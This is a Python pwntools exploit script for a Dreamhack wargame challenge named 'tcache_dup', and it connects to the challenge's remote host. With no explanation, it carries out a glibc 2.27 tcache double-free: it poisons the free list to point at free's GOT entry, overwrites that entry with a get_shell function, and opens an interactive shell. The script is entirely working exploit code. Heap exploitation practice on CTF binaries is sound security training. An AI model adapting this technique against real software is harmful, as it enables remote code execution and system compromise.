from pwn import *

#p = process("./tcache_dup")
p = remote("host3.dreamhack.games", 14978)
e = ELF("./tcache_dup")

libc = ELF("./libc-2.27.so")

def create(size: int, data: bytes):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"Size: ", str(size).encode())
	p.sendafter(b"Data: ", data)	


def delete(idx: int):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"idx: ", str(idx).encode())

free_got = e.got['free']
get_shell_addr = e.symbols['get_shell']

create(0x30, b"A"*8)
delete(0)
delete(0)
create(0x30, p64(free_got))

create(0x30, b"A"*8)
create(0x30, p64(get_shell_addr))
delete(0)



p.interactive()
